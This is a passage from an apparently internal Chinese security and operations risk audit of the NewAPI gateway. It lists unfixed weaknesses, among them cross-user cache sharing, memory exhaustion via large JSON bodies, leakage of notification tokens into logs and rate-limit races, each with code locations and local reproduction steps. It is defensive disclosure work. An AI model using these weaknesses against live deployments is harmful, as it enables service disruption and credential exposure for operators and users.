- 修复建议：默认多租户部署应把 NewAPI `user_id` 或 `token_id` 纳入 affinity cache key，或提供规则级字段如 `include_user_id/include_token_id/include_channel_credential_fp`，默认对 Codex/Claude 开启至少 user 维度隔离。若确实要跨用户共享上游 prompt cache，应由 Root 显式开启，并限制到可信 group/内部 token。日志和 stats 应记录建立 affinity 的 user/token 摘要、命中时当前 user/token 摘要和是否跨主体命中；发现跨主体命中应可告警。对低熵 key 增加最小长度/熵检查，或把 user id 与用户提供 key 一起 hash 后存储，避免常见 key 污染。
- 优先级：P2
- 当前状态：已确认默认 affinity cache key 不包含 NewAPI user/token 维度，跨用户相同 affinity value 会共享同一缓存项；尚未修复。

### 风险 246：affinity 只缓存 `channel_id`，多 key 渠道内仍会随机或轮询换 key，无法保证同一 `prompt_cache_key`/session 粘到同一个上游账号

- 标题：默认 Codex/Claude affinity 的缓存值只有渠道 id；命中 preferred channel 后仍每次调用 `GetNextEnabledKey()` 选择当前 enabled key，随机和轮询多 key 渠道会让同一个 affinity key 在同一 channel 内跨不同上游 key/账号漂移。
- 影响范围：Codex/Claude prompt cache 运营收益、上游账号风控、供应商缓存命中率、Vertex/service account access token 缓存、渠道内多 key 成本归因、单 key 自动禁用后的会话连续性、cache stats 和客服排障。
- 触发条件：Root 启用默认 channel affinity；目标模型可路由到一个 `ChannelInfo.IsMultiKey=true` 的渠道；该渠道 `multi_key_mode=random` 或 `multi_key_mode=polling`，且至少两个 enabled key；用户在 TTL 内重复使用同一个 `prompt_cache_key` 或 `metadata.user_id`；其中某个 key 被自动禁用、手动禁用、删除，或不同 key 背后是不同供应商账号/区域/额度池。
- 涉及文件/函数：
  - `setting/operation_setting/channel_affinity_setting.go:76-112`：默认开启 channel affinity，Codex 以 `prompt_cache_key`、Claude 以 `metadata.user_id` 建立粘性，语义上是为了让同一 trace/session 复用上游上下文和缓存。
  - `service/channel_affinity.go:337-349`：cache key suffix 只由 rule、可选 model、using group 和 affinity value 组成，不包含 channel 内 key index、key fingerprint 或供应商账号维度。
  - `service/channel_affinity.go:681-706`：`RecordChannelAffinity` 成功后写入的 value 是 `channelID`，没有写入当次实际使用的 `ContextKeyChannelMultiKeyIndex` 或 `ContextKeyChannelKey` 摘要。
  - `middleware/distributor.go:104-130`：affinity 命中后只把 preferred channel 赋给本次请求；没有恢复曾经建立 affinity 时使用的 key/index。
  - `middleware/distributor.go:399-436`：选中渠道后才调用 `SetupContextForSelectedChannel`，这里每次都会重新执行 `channel.GetNextEnabledKey()` 并设置 `ContextKeyChannelMultiKeyIndex`。
  - `model/channel.go:199-283`：多 key 渠道在 random 模式每次随机取 enabled key，在 polling 模式按 `MultiKeyPollingIndex` 轮询取 enabled key；两种模式都不会按 affinity key 固定到同一个 key。
  - `constant/multi_key_mode.go:3-7` 与 `web/default/src/features/channels/types.ts:31-32`：多 key 模式明确支持 `random` 和 `polling`，前端默认值也是 random。
  - `model/channel.go:641-690` 与 `model/channel.go:706-778`：自动禁用/启用以真实 `usingKey` 查找当前数组 index，并更新 `MultiKeyStatusList`；被禁用 key 会让后续相同 affinity session 继续在同 channel 中选其它 enabled key，而不是显式失效或重新建立 affinity。
  - `controller/channel.go:1590-1696`：删除单个 key 或删除自动禁用 key 会重排剩余 key 的 index；旧 affinity 记录仍只指向 channel id，无法知道历史 session 曾经对应哪个 key。
  - `service/log_info_generate.go:272-278`：管理员日志可以看到本次 `multi_key_index`，但 `MarkChannelAffinityUsed` 的日志信息只记录 `channel_id/key_fp` 等 affinity value 摘要，没有记录“本次 affinity 命中使用了哪个 channel key”作为粘性判断。
  - `relay/channel/vertex/service_account.go:40-46`：Vertex access token 缓存会把多 key index 放进 token cache key，说明某些 provider 的账号/凭证状态实际依赖 channel 内 key index；affinity 不固定 index 会跨账号切换。
- 可能后果：运营以为 `prompt_cache_key=session-1` 已被粘到某个供应商账号并能稳定获得 prompt cache 命中，但多 key random/polling 会把同一 session 的后续请求打到同一 channel 的不同 key 上，导致上游缓存命中率下降、cache savings 统计被低估或误归因。若多 key 实际对应不同 OAuth/service account/区域账号，同一客户会话可能跨账号留下 trace，供应商侧风控、限流、封禁和账单排障都被打散。某个 key 被自动禁用后，affinity 不会感知“原 key 已失效”，而是继续在同 channel 内选其它 key；这会隐藏单 key 故障对该 session 的影响，也可能让问题 session 污染其它 key。删除 key 后 index 重排，还会让日志中看到的历史 `multi_key_index` 无法解释旧 affinity 命中到底属于哪个账号。该问题不是充值入账漏洞，但会直接影响渠道成本、缓存收益、供应商风控和故障隔离，是运营风险。
- 复现思路：本地创建一个支持 `/v1/responses` 的多 key 假渠道，配置两个 key 分别映射到假上游账号 A/B，模式设为 polling 或 random。连续用相同 `prompt_cache_key=same-session` 请求三次，确认 `RecordChannelAffinity` 只写入同一个 channel id，而日志或假上游显示实际 key/index 在 A/B 间变化。再禁用或删除第一次命中的 key，重复同一 `prompt_cache_key`，观察请求仍命中同 channel 并换到其它 key，而不是清理或重建 affinity。全程使用本地假上游，不向真实 provider 发送高频请求。
- 修复建议：把 channel affinity 的目标从单纯 `channel_id` 扩展为可选的 `channel_id + stable_key_id/key_fingerprint`。当命中多 key 渠道时，如果规则声明需要 provider account 粘性，应按 affinity key 固定到同一 enabled key；该 key 禁用、删除或 fingerprint 变化时应清理该 affinity，或降级重新选渠并记录原因。多 key 需要稳定 key id 和墓碑记录，不能只用数组 index。若某些渠道希望继续把 affinity 只作为 channel 级粘性，应在规则中显式配置 `affinity_scope=channel`；默认 Codex/Claude 模板更适合 `affinity_scope=channel_key` 或至少在命中日志/stats 中记录本次 key fingerprint。cache stats 应增加 channel id、key fingerprint 和是否跨 key 命中的计数，便于判断 prompt cache 收益是否被多 key 轮转稀释。
- 优先级：P2
- 当前状态：已确认 affinity 只缓存 channel id，命中多 key preferred channel 后仍随机/轮询选择 key；尚未修复。

### 风险 248：Gemini/Vertex 任务实时查询忽略任务提交时保存的 key，改用当前渠道 `Key` 拉取上游状态，key 轮换或多 key 渠道会用错账号推进任务终态

- 标题：任务提交时会把 Gemini/Vertex 实际使用的 `ChannelMeta.ApiKey` 保存到 `TaskPrivateData.Key`，后台轮询和视频 content 代理也会优先使用该任务级 key；但 `/v1/videos/:task_id` 实时查询的 `tryRealtimeFetch` 直接使用当前 `channelModel.Key`，没有使用 `task.PrivateData.Key`，也没有检查渠道是否仍 enabled。
- 影响范围：Gemini/Vertex 视频任务、OpenAI Video fetch、任务实时查询、任务终态 CAS、失败退款/成功差额结算、渠道 key 轮换、多 key 渠道、自动禁用后的任务排障、上游账号归因。
- 触发条件：用户提交 Gemini/Vertex 视频任务；提交后渠道 key 被编辑、OAuth/Service Account 轮换、多 key 列表变更、渠道被禁用但历史任务仍可查询，或任务提交时使用的是多 key 中某一个具体 key；用户在后台轮询处理前调用 `/v1/videos/:task_id` 或兼容视频任务查询接口。
- 涉及文件/函数：
  - `model/task.go:172-179`：`InitTask` 对 Gemini/Vertex 会把 `relayInfo.ChannelMeta.ApiKey` 写入 `privateData.Key`，说明任务设计上知道应保存提交时实际凭证。
  - `controller/relay.go:579-597`：任务成功后把 `InitTask` 生成的 `PrivateData` 插入任务表，任务级 key 会随任务保存。
  - `controller/task_video.go:77-83`：旧视频后台轮询先取 `channel.Key`，但如果 `task.PrivateData.Key` 非空会覆盖为任务保存的 key。
  - `service/task_polling.go:440-500`：新通用视频轮询在终态 CAS 成功后才结算或退款；轮询侧已在其它路径尽量用任务上下文处理终态。
  - `relay/relay_task.go:421-443`：`tryRealtimeFetch` 通过 `model.GetChannelById(task.ChannelId, true)` 读取当前渠道后，直接调用 `adaptor.FetchTask(baseURL, channelModel.Key, ...)`，没有读取 `task.PrivateData.Key`。
  - `relay/relay_task.go:458-478`：实时查询会把上游返回的状态、进度和结果 URL 写回任务，并调用 `task.UpdateWithStatus(snap.Status)`；这条终态推进路径已由风险 50 记录其不做结算/退款。
  - `controller/video_proxy.go:87-103`：视频内容代理对 Gemini 明确要求 `task.PrivateData.Key`，对 Vertex 会调用 helper 取 key，这是实时查询之外的正向边界。
  - `controller/video_proxy_gemini.go:208-224`：Vertex content proxy 会优先用 `task.PrivateData.Key`，没有任务级 key 时才回落到当前渠道 keys；说明实时查询直接用当前 channel key 与相邻实现不一致。
  - `model/channel.go:199-283` 与风险 246：多 key 渠道每次可能选择不同 key；任务提交时保存了当次 key，但实时查询没有用它。
- 可能后果：任务 A 原本在 Gemini/Vertex 账号或 service account X 创建，提交后运营轮换渠道 key 到账号 Y，或多 key 渠道当前 `channel.Key` 包含不同 key 池；用户查询任务详情时，实时查询会拿 Y 或整段当前 key 去上游查询 X 的任务号。轻则查询失败并回落旧任务状态，用户看到任务长期处理中；重则上游返回“任务不存在/失败/权限错误”并被解析为失败状态，`tryRealtimeFetch` 可能把本地任务推进 FAILURE/SUCCESS，而这条路径又绕过风险 50 里的退款/结算逻辑。对于多 key 渠道，某个 key 被禁用或删除后，历史任务本应继续用提交时 key 查询结果，但实时查询会跟随当前渠道 key 漂移，导致任务结果、错误原因和供应商账号归因不一致。渠道被禁用后历史任务仍可查询是合理需求，但当前实现没有区分“允许历史查询”和“使用正确历史凭证”。
- 复现思路：本地创建 Gemini/Vertex 假任务渠道，提交任务时让 `PrivateData.Key=key-A`，上游任务号只在 key-A 下可查询；提交成功后把渠道 key 改成 `key-B` 或多 key 字符串。调用 `/v1/videos/:task_id`，观察 `tryRealtimeFetch` 是否用 key-B 查询并导致状态不更新或错误推进。再让后台轮询或 content proxy 使用同一任务，确认它们会优先使用 `PrivateData.Key`。复现只用本地假上游，不访问真实 Gemini/Vertex。
- 修复建议：`tryRealtimeFetch` 应与后台轮询和 content proxy 使用同一凭证解析函数：优先 `task.PrivateData.Key`，再按兼容策略回落当前渠道 key；回落时必须记录 `task_key_missing` 告警，并避免在没有正确历史 key 时把任务推进终态。多 key 任务应保存稳定 key fingerprint/key id，而不仅是明文 key；渠道 key 轮换或删除不应破坏历史任务查询。实时查询如果赢得终态 CAS，应调用与后台轮询相同的结算/退款函数，或者改为只读展示，不在用户 fetch 路径推进终态。
- 优先级：P2
- 当前状态：已确认 `tryRealtimeFetch` 使用当前 `channelModel.Key`，而任务提交、后台轮询和 content proxy 已存在任务级 key 语义；尚未修复。

### 风险 249：磁盘 BodyStorage 开启后，JSON 模型提取和 affinity gjson 仍会 `Bytes()` 整块读回大请求体，削弱“磁盘换内存”的保护

- 标题：大 JSON 请求在开启 disk body cache 后本应由 disk-backed `BodyStorage` 承载，`UnmarshalBodyReusable` 也对磁盘 JSON 做了流式解码优化；但 distributor 的 JSON model/group 提取和 channel affinity 的 gjson key 提取都直接调用 `storage.Bytes()`，会把已经落盘的大请求体重新分配为完整 `[]byte`。
- 影响范围：大 JSON chat/responses/messages 请求、多模态 base64 JSON、Codex `/v1/responses`、Claude `/v1/messages`、自定义 gjson affinity 规则、磁盘缓存开启后的内存峰值、并发大请求、容器 OOM 和延迟抖动。
- 触发条件：Root 开启 `performance_setting.disk_cache_enabled`；请求体 `Content-Length` 大于 `disk_cache_threshold_mb` 且小于 `MAX_REQUEST_BODY_MB`；请求为 JSON；普通 distributor 需要提取 `model/group`，或请求匹配默认 Codex/Claude affinity gjson 规则；多个大请求并发进入 relay。
- 涉及文件/函数：
  - `setting/performance_setting/config.go:29-34`：磁盘缓存默认关闭；开启后默认阈值是 10MB、最大磁盘缓存 1GB，这是本风险的前置条件。
  - `common/init.go:136-137`：请求体最大值由 `MAX_REQUEST_BODY_MB` 控制，默认 128MB；本风险不绕过总大小上限，但会放大上限内请求的瞬时内存占用。
  - `common/body_storage.go:261-303`：`CreateBodyStorageFromReader` 在磁盘缓存开启、`Content-Length` 超过阈值且磁盘空间可用时，会把请求体写到 disk-backed `BodyStorage`。
  - `common/body_storage.go:198-230`：`diskStorage.Bytes()` 会 `make([]byte, d.size)` 并 `ReadFull` 整个临时文件，返回完整 body 副本。
  - `common/gin.go:108-130`：`UnmarshalBodyReusable` 对 disk-backed JSON 专门使用 `DecodeJson(storage, v)` 流式解码，说明系统已有避免大 JSON 回堆内存的设计意图。
  - `middleware/distributor.go:191-204`：`getModelFromJSONBody` 调用 `common.GetBodyStorage` 后直接 `storage.Bytes()`，再用 `gjson.ValidBytes/GetManyBytes` 提取 `model/group`；这条路径在 affinity 前就会发生。
  - `service/channel_affinity.go:289-331`：gjson key source 也通过 `common.GetBodyStorage` 后 `storage.Bytes()`，再 `gjson.GetBytes` 提取 `prompt_cache_key`、`metadata.user_id` 或自定义 path。
  - `setting/operation_setting/channel_affinity_setting.go:76-112`：默认 Codex 和 Claude affinity 规则都使用 gjson，从 `/v1/responses` 的 `prompt_cache_key` 和 `/v1/messages` 的 `metadata.user_id` 取值。
  - `controller/relay.go:100-118` 与 `controller/relay.go:199-207`：后续 relay 对超大请求会映射为 413，但对于小于上限的大请求，路由阶段已经可能产生完整内存副本。
  - `docs/newapi-ops-risk-audit.md:4796-4813`：已有风险覆盖 multipart 解析把磁盘请求体读回内存；本轮新增聚焦 JSON model extraction 和 channel affinity gjson，不重复 multipart。
- 可能后果：运营开启 disk cache 是为了在大请求或多模态 base64 场景下降低内存峰值，但 JSON 请求仍会在 distributor 阶段被整块读回堆内存。单个 80-120MB JSON 在落盘后又被 `Bytes()` 分配一份，多个并发请求会迅速推高 RSS，引发 GC 抖动、容器 OOM 或请求排队；如果请求还匹配 affinity gjson，可能在 model extraction 之外再次扫描/读取同一大 body，进一步增加 CPU 和内存压力。攻击者不需要绕过认证或大小上限，只要持有有效 token 并发送接近上限的大 JSON，就能让“磁盘换内存”效果显著打折。该问题不直接造成充值或扣费错误，但会影响运营稳定性、渠道可用性和高成本多模态请求的服务质量。
- 复现思路：本地开启 `performance_setting.disk_cache_enabled=true`、阈值 10MB，保持 `MAX_REQUEST_BODY_MB=128`；构造一个 80MB JSON `/v1/responses` 请求，包含合法 `model` 和 `prompt_cache_key`，其它字段可用本地假 adaptor 消费。对比关闭 affinity、开启 affinity、以及改造前后 `getModelFromJSONBody` 的 RSS/allocs/GC 次数；确认 `diskStorage.Bytes()` 是否在 pprof 中分配接近 body size 的 `[]byte`。复现只使用本地假上游和测试 token，不向真实 provider 发送大 payload。
- 修复建议：为 JSON model/group 提取和 affinity gjson 增加流式或有限读取路径。最小修复可以在 `getModelFromJSONBody` 对 disk-backed JSON 使用 `json.Decoder` 只解析顶层 `model/group`，避免 `gjson.ValidBytes` 读全量；affinity 的 gjson key source 应支持 `max_scan_bytes/max_value_bytes`，默认只允许提取顶层短字符串，或在 disk-backed/超阈值 body 上跳过 affinity 并记录 `affinity_body_too_large_skipped`。更彻底的方案是把常用 JSON key 提取改为共享的 streaming field extractor，支持 dot path 但限制深度和数组扫描；`ValueRegex` 前先做长度/类型限制，避免对象/数组 `Raw` 作为 affinity value。性能设置页应提示：开启 disk cache 并不等于所有 JSON 解析都零拷贝，直到这些路径改造完成。
- 优先级：P2
- 当前状态：已确认 disk-backed JSON 存在 `getModelFromJSONBody -> storage.Bytes()` 和 `extractChannelAffinityValue(gjson) -> storage.Bytes()` 两条整块回读路径；尚未修复。

### 风险 251：Redis 关闭时 affinity cache 是单进程本地 LRU，Root 清理/统计只作用于当前实例；合法修改 `MaxEntries` 后已初始化缓存也不会重建

- 标题：`HybridCache` 在 Redis 关闭时退回每进程 `hot.HotCache`；channel affinity 主 cache 和 usage stats cache 都用 `sync.Once` 初始化。本地模式下，多实例之间不会共享 affinity 记录，Root 调用清理/统计接口只影响负载均衡命中的当前实例；同时合法保存新的 `MaxEntries` 后，已初始化的本地 LRU 容量不会随运行态设置变化。
- 影响范围：未启 Redis 的多实例部署、Codex/Claude affinity 路由一致性、Root 清理 affinity cache、缓存统计页、事故回滚、MaxEntries/DefaultTTL 调整、usage cache stats、运营判断“已清空/已降低容量/已统一路由”的可信度。
- 触发条件：多实例部署但 Redis 未启用或 Redis 临时不可用；某些请求在实例 A 建立 affinity，后续请求落到实例 B；Root 在后台清理 all 或按 rule 清理 cache；Root 合法调整 `channel_affinity_setting.max_entries/default_ttl_seconds`；cache 已在旧配置下被访问并初始化。
- 涉及文件/函数：
  - `service/channel_affinity.go:33-39`：channel affinity 主 cache 和 usage stats cache 都是包级变量，并由 `sync.Once` 控制初始化。
  - `service/channel_affinity.go:81-108`：主 cache 初始化时读取 `setting.MaxEntries` 和 `DefaultTTLSeconds` 创建 `hot.NewHotCache`；一旦 `channelAffinityCacheOnce` 执行过，后续配置变更不会重建该 cache。
  - `service/channel_affinity.go:934-963`：usage stats cache 同样用 `sync.Once` 读取 `MaxEntries/DefaultTTLSeconds` 创建本地 LRU。
  - `pkg/cachex/hybrid_cache.go:80-128`：`HybridCache.Get/SetWithTTL` 在 Redis enabled 时读写 Redis，否则只读写当前进程的 memory cache。
  - `pkg/cachex/hybrid_cache.go:131-137`：`Keys()` 在 Redis 模式扫描所有匹配 key，在本地模式只返回当前进程 HotCache 的 keys。
  - `pkg/cachex/hybrid_cache.go:229-270`：`DeleteMany` 在本地模式只删除当前进程的 keys；不会广播给其它实例。
  - `pkg/cachex/hybrid_cache.go:273-285`：`Capacity/Algorithm` 在 Redis 模式返回 `0/redis`，本地模式返回当前进程 HotCache 的容量和算法。
  - `controller/channel_affinity_cache.go:11-60` 与 `router/api-router.go:189-196`：Root 的 stats/clear 接口直接调用当前进程的 service 方法，没有多实例广播、锁或 ack。
  - `service/channel_affinity.go:198-210`：`ClearChannelAffinityCacheAll` 先 `cache.Keys()` 再 `DeleteMany(keys)`，本地模式只枚举/删除当前进程本地 keys。
  - `service/channel_affinity.go:213-215` 之后的按 rule 清理同样基于当前 cache keys，无法覆盖其它进程内存。
  - `docs/newapi-ops-risk-audit.md:7241-7258`：风险 240 已覆盖高基数 key 和 Redis 模式无 LRU 上限；本轮新增聚焦 Redis 关闭/本地 LRU 的多实例清理、统计和合法配置热更新不生效。
  - `docs/newapi-ops-risk-audit.md:7332-7358`：风险 243 已覆盖非法 affinity 配置先入库和旧运行态保留；本轮新增聚焦合法 `MaxEntries` 变更在 cache 初始化后不重建。
- 可能后果：在未启 Redis 的多实例部署中，同一 `prompt_cache_key` 命中实例 A 时可能固定到 channel 1，命中实例 B 时又重新选择 channel 2；用户看到同一 session 在不同请求间仍然漂移，运营却以为 channel affinity 已开启。事故中 Root 点击“清空全部 affinity cache”后，只有当前实例清空，其它实例仍保留旧 preferred channel，导致部分流量继续命中坏渠道或旧 OAuth/key 语义。统计页显示的 total/by rule 也只是当前实例快照，不能代表全站。Root 把 `MaxEntries` 从 100000 降到 1000 试图缓解高基数攻击时，如果 cache 已初始化，当前进程的 HotCache 容量仍是旧值；反过来扩容也不会生效，可能继续驱逐有效 session。该问题不直接造成充值漏洞，但会让事故修复、容量控制和路由一致性在多实例环境下不可信。
- 复现思路：本地启动两个实例且关闭 Redis，构造相同 `prompt_cache_key` 请求分别打到实例 A/B，检查两个进程内 affinity keys 和 preferred channel 是否独立。随后只向实例 A 调用 `DELETE /api/option/channel_affinity_cache?all=true`，确认实例 B 同 key 仍可命中旧 channel。再在 cache 初始化后把 `channel_affinity_setting.max_entries` 改小，调用 stats 查看当前 `cache_capacity` 是否仍为旧值。复现只用本地多进程和假渠道，不触碰生产 Redis。
- 修复建议：多实例部署应强制要求 Redis 才能启用 channel affinity，或在后台状态中显示“本地单实例模式，不保证跨实例粘性/清理”。Root 清理接口应支持广播到所有实例并等待 ack，或把本地 cache 改为只用于单实例明确模式。配置变更后应重建 affinity caches 或提供 `ReloadChannelAffinityCache(setting)`，让合法 `MaxEntries/DefaultTTLSeconds` 立即影响新 cache；若担心重建丢失记录，应至少在 stats 返回 `configured_capacity` 与 `actual_capacity`，并提示需要重启/清空。Redis 模式也应增加全局容量/淘汰策略或每规则限额，避免风险 240 中的无上限 key 空间。
- 优先级：P2
- 当前状态：已确认 Redis 关闭时 affinity cache/usage stats cache 是进程本地，清理/统计只作用于当前进程；`sync.Once` 初始化后合法容量变更不会重建本地 LRU，尚未修复。

### 风险 253：xAI/Baidu v2 `-search` 后缀会打开上游搜索，但文本结算不记录搜索工具调用和附加费，成本只能依赖人工给 `*-search` 单独定价

- 标题：`xai` 与 `baidu_v2` adaptor 把 `*-search` 模型后缀剥成基础模型并注入上游搜索参数；`PostTextConsumeQuota` 的工具附加费只识别 OpenAI Responses/Search Preview 和 Claude usage 里的搜索次数，未识别这些后缀触发的搜索调用。
- 影响范围：xAI/Grok 搜索模型、Baidu v2 `web_search`、模型后缀售卖、工具附加费、消费日志、成本对账、`AcceptUnsetRatioModel` 兜底用户、Root 自定义模型倍率。
- 触发条件：渠道启用 `grok-*-search` 或 `ernie-*-search` 等后缀模型；用户请求该后缀模型；运营把搜索后缀模型配置成与基础模型相同或接近的倍率，或用户设置允许未配置模型倍率；上游搜索产生额外 provider 成本。
- 涉及文件/函数：
  - `relay/channel/xai/adaptor.go:67-74`：当 `info.UpstreamModelName` 以 `-search` 结尾时，剥离后缀，把 request model 改成基础模型，并注入 `search_parameters.mode=on`。
  - `relay/channel/baidu_v2/adaptor.go:82-94`：当 `info.UpstreamModelName` 以 `-search` 结尾时，剥离后缀并默认注入 `web_search.enable=true` 等搜索参数。
  - `service/text_quota.go:84-122`：工具附加费只处理 Responses `web_search_preview`、OpenAI `search-preview` 模型名和 `claude_web_search_requests`，没有 xAI/Baidu v2 搜索后缀或 context 标记。
  - `service/text_quota.go:463-470`：消费日志 `other.web_search` 同样只在上述计数存在时写入，xAI/Baidu v2 后缀搜索不会留下工具调用数和工具价格。
  - `relay/channel/xai/text.go:35-76`、`relay/channel/xai/text.go:80-106`：xAI 响应处理只转换 token usage，没有把搜索调用数写入 context。
  - `relay/channel/baidu_v2/adaptor.go:120-123`：Baidu v2 响应复用 OpenAI adaptor 的响应处理，未在该 adaptor 内补充搜索调用计数。
  - `relay/helper/price.go:67-120` 与 `setting/ratio_setting/model_ratio.go:731-745`：预扣和结算按 `OriginModelName` 查模型价格/倍率；`FormatMatchingModelName` 只特殊处理 Gemini thinking budget 和 gizmo 通配，不会把 `*-search` 映射到基础模型或工具价格。
  - `docs/newapi-ops-risk-audit.md:3151-3155`：早期复核已确认正式请求仍要求 `*-search` 这个 OriginModel 有渠道能力和价格配置；本轮新增聚焦“即使能定价，也没有把搜索调用作为工具附加费和日志维度记录”。
- 可能后果：平台把 xAI/Baidu 搜索作为“模型后缀能力”售卖时，真实上游会执行搜索，但本地账单只按 `*-search` 的模型 token 价格扣费；如果运营沿用基础模型倍率、未意识到搜索有额外成本，或开启 `AcceptUnsetRatioModel` 让未配置模型走兜底倍率，就可能长期少收搜索成本。更隐蔽的是消费日志不会出现 `web_search=true`、调用次数或工具价格，运营后续只能从模型名后缀猜测发生过搜索，无法按工具维度统计搜索成本、做用户告警或排查“为什么某模型成本突然变高”。这不是普通用户直接绕过渠道能力，因为 `*-search` 仍需渠道模型和价格路径放行；风险在于成本能力被隐藏在后缀里，未进入统一工具计费和审计体系。
- 复现思路：本地配置 xAI 测试渠道支持 `grok-3-search`，将 `grok-3-search` 倍率配置成与 `grok-3` 相同或开启用户 `AcceptUnsetRatioModel`；发起一次 chat completions 请求，抓取 outbound body 确认 `search_parameters.mode=on`；请求成功后检查消费日志 `other` 是否缺少 `web_search/web_search_call_count/web_search_price`，扣费是否只来自 token usage 和模型倍率。Baidu v2 同理检查 `web_search.enable=true`。复现只用本地/假渠道或测试上游，不对生产 provider 发起真实搜索。
- 修复建议：把后缀触发的搜索能力纳入统一工具计费模型：xAI/Baidu v2 adaptor 在启用搜索时向 context 写入 provider、tool name、默认调用次数或上游返回的真实次数；`calculateTextToolCallSurcharge` 支持 `web_search` 按 provider/model 的价格策略计费，并在日志记录 tool name、provider、调用数和价格。若无法获取真实次数，至少要求 `*-search` 模型必须有显式非基础模型价格，并在后台保存渠道/模型时提示“该后缀会启用上游搜索但不会自动计工具费”。`AcceptUnsetRatioModel` 对带 `-search`、`-thinking`、`-tools` 等高成本能力后缀应默认拒绝或按高风险默认价计费。
- 优先级：P2
- 当前状态：已确认 xAI/Baidu v2 后缀会启用上游搜索参数，文本结算和日志没有对应工具调用维度；尚未修复。

### 风险 255：Bark/Gotify 直连通知失败会把完整最终 URL 写入系统日志，可能泄露设备 key、Gotify token 和通知内容

- 标题：非 Worker 模式下 `sendBarkNotify`/`sendGotifyNotify` 用最终 URL 直接 `client.Do`；Go 的请求错误常包含完整 URL。Bark 最终 URL已替换通知标题/内容，Gotify 最终 URL 把 `gotifyToken` 拼到 `?token=`，通知失败后错误会被上层 `SysLog/SysError` 记录。
- 影响范围：用户自定义 Bark 通知、Gotify 通知、额度不足通知、订阅额度不足通知、上游模型更新通知、系统日志、集中日志、通知 token、用户余额/充值链接通知内容。
- 触发条件：用户设置通知类型为 Bark 或 Gotify；通知触发时目标不可达、DNS 失败、TLS 失败、代理/网络错误或重定向异常；非 Worker 模式直连；错误字符串进入系统日志。
- 涉及文件/函数：
  - `service/user_notify.go:118-130`：Bark 通知会把 `{{title}}`、`{{content}}` 替换到 `finalURL`，URL 可能包含 Bark device key、通知标题、余额和充值链接等内容。
  - `service/user_notify.go:158-175`：Bark 直连模式先校验 `finalURL`，随后 `http.NewRequest` 和 `client.Do(req)`；`client.Do` 失败时返回 `failed to send bark request: %v`。
  - `service/user_notify.go:188-199`：Gotify 通知把 `gotifyToken` 拼成 `strings.TrimSuffix(gotifyUrl, "/") + "/message?token=" + url.QueryEscape(gotifyToken)`。
  - `service/user_notify.go:252-270`：Gotify 直连模式同样校验 `finalURL` 后 `client.Do(req)`，失败时返回 `failed to send gotify request: %v`。
  - `service/quota.go:492-495` 与 `service/quota.go:542-543`：额度和订阅额度通知失败会把 `err.Error()` 写入 `SysError`。
  - `service/user_notify.go:42-43`、`service/user_notify.go:19-21`：上游模型更新和 Root 通知失败也会把 `err.Error()` 写入系统日志。
  - `service/webhook.go:91-122`：Webhook 直连也会把 HTTP 错误传回上层；但 webhook secret 在 header 中，不像 Gotify 一样拼在 URL query，这是本轮不扩大到所有 webhook 的边界。
  - `common/ssrf_protection.go:252-326`：SSRF 校验失败错误只包含 scheme、host、端口或 IP，不直接包含 query；真正敏感的是后续 `client.Do` 等网络错误可能带完整 URL。
  - `docs/newapi-ops-risk-audit.md:704-719`：风险 37 已覆盖通知 URL 保存阶段只做格式校验、运行时依赖 SSRF 配置；本轮新增聚焦发送失败错误链路中的 URL/token 明文。
  - `docs/newapi-ops-risk-audit.md:4831-4854` 与 `docs/newapi-ops-risk-audit.md:4878-4894`：风险 188/190 已覆盖 Worker/下载/通知 URL 的 SSRF 和敏感 URL 大面；本轮新增的是非 Worker 直连通知的 `client.Do` 错误日志。
- 可能后果：用户的 Gotify application token、Bark device key、通知标题/正文、余额提醒、充值链接或其它业务通知内容可能进入系统日志和集中日志。虽然这些是用户自配通知凭证，不是平台渠道 key，但泄露后可被用来向用户设备推送垃圾通知、观察用户订阅/余额状态，或作为进一步钓鱼材料。运营排查通知失败时看到完整 URL，也会把用户通知 token 扩散到客服截图、工单和备份。该问题不改变充值或扣费结果，但会增加隐私和凭证泄露面。
- 复现思路：本地用户配置 Gotify URL 为不可达域名或会 TLS 失败的地址，token 设为 `secret-token-test`；触发低额度通知或直接调用 `NotifyUser` 测试，观察系统日志中的 `failed to send gotify request` 是否包含 `/message?token=secret-token-test`。Bark 可配置包含假 device key 和 `{{content}}` 的 URL，观察失败日志是否包含 device key 和通知内容。只使用本地假 token，不使用真实用户通知服务。
- 修复建议：通知发送错误必须脱敏后再返回给上层日志。为 URL 错误增加 `SafeURLForLog`：只保留 scheme、host、路径模板和 query key，不保留 query value；Bark/Gotify 应把 token 放入 header 或请求体而不是 URL query，无法改变协议时日志必须截断到 host/path。`sendBarkNotify`/`sendGotifyNotify` 可以在 `client.Do` 失败时返回分类错误，如 `notify request failed: network_error host=...`，不拼接原始 `err.Error()`。上层 `NotifyUser` 日志只记录 user id、notify type、host hash、状态码/错误类别。增加测试：包含 `token=secret`、Bark device key 和通知内容的失败请求错误不得出现在日志字符串中。
- 优先级：P2
- 当前状态：已确认 Bark/Gotify 最终 URL 包含敏感值，直连失败错误会原样传给上层日志；尚未修复。

### 风险 256：通知频控不是原子扣减且本地模式只在单进程生效，高并发低额度请求可突破配置的发送上限

- 标题：`CheckNotificationLimit` 的 Redis 路径使用 `GET -> SET/INCR` 分步逻辑，本地路径使用 `sync.Map.Load -> Store` 重写计数；两条路径都不是原子判定加计数。限流 key 又包含小时桶但 TTL 默认只有 10 分钟，实际窗口和“每小时”语义不一致。
- 影响范围：低钱包额度通知、低订阅额度通知、Bark/Gotify/Webhook/Email 通知成本、用户骚扰投诉、系统日志、通知失败告警、多实例部署和 Redis 关闭部署。
- 触发条件：用户额度或订阅额度低于阈值；短时间内并发请求触发 `checkAndSendQuotaNotify` 或 `checkAndSendSubscriptionQuotaNotify`；通知后端较慢或失败；多实例部署关闭 Redis，或 Redis 开启但多个请求同时读到空计数/低计数。
- 涉及文件/函数：
  - `common/init.go:145-146`：默认 `NOTIFY_LIMIT_COUNT=2`、`NOTIFICATION_LIMIT_DURATION_MINUTE=10`，运营容易理解为短窗口内最多 2 次。
  - `service/quota.go:452-498`：钱包低额通知在异步 `gopool.Go` 中触发，低余额用户的多个并发请求都会进入通知检查。
  - `service/quota.go:500-546`：订阅低额通知同样异步触发，且高并发 relay 完成后会重复检查同一用户/事件。
  - `service/user_notify.go:57-64`：发送前只调用一次 `CheckNotificationLimit(userId, data.Type)`，返回 true 后就继续发送，没有后置合并、去重或 outbox。
